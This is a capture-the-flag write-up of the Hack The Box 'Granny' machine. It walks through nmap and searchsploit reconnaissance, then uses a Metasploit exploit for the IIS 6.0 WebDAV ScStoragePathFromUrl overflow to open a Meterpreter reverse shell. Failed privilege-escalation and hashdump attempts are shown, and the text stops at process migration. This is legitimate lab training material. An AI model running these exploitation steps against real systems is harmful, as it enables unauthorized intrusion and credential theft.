# Hackthebox - Granny

My First HtB writeup!

This is an easy Windows box and a good one to start learning with. 


## Nmap

We start the CTF with an initial nmap scan to check for open ports/services (-sV) on default nmap ports and run default scripts (-sC) then output the results in all formats (-oA).
```
root@kali:~/htb/machines/completed/granny# nmap -sV -sC -oA nmap/init 10.10.10.15
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-06 13:14 EDT
Nmap scan report for 10.10.10.15
Host is up (0.022s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Wed, 06 May 2020 17:15:41 GMT
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.63 seconds
```

The only service we find open on granny is http running an old version of IIS (6.0) Let's pass this info into searchsploit to see if we have any vulnerabilities for this IIS version.

```
root@kali:~/htb/machines/completed/granny# searchsploit IIS 6.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                           | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                                    | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                                      | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                               | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                     | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                   | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                                | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                                | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                            | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                                                                                              | windows/remote/8765.php
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                   | windows/remote/19033.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

And we do! There's quite a few vulnerabilities listed in the results, We are most interested in a vulnerability that will give us a shell on granny and one that references WebDAV because we see that referenced in the previous nmap output. This trims down our target exploit to just one:
```
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                   | windows/remote/41738.py
```

We can copy this file to our current directory with ```searchsploit -m windows/remote/41738.py```. This exploit acts as a PoC and only pops calc.exe. So, instead of editing the file, let's first check to see if there is a working exploit in Metasploit. Open up msfconsole then search for the exploit. We are returned with a module.

```
msf5 > search ScStoragePathFromUrl

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes     Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```

Let's go ahead and switch to the exploit, modify RHOST to point to granny, and get a meterpreter shell!

```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (180291 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.15:1030) at 2020-05-06 13:33:06 -0400

meterpreter >
```

The only thing we can really do from here is drop into a cmd shell. Meterpreter functions aren't working due to permission issues

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 292 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>exit
exit
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: Access is denied.
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter >
```

Let's see if we can migrate our process to run Metasploit functions. We will background the session, try to migrate our process with post/windows/manage/migrate, set our session option, and migrate. We don't need to specify any other options here, Metasploit will take care of the rest with defaults.























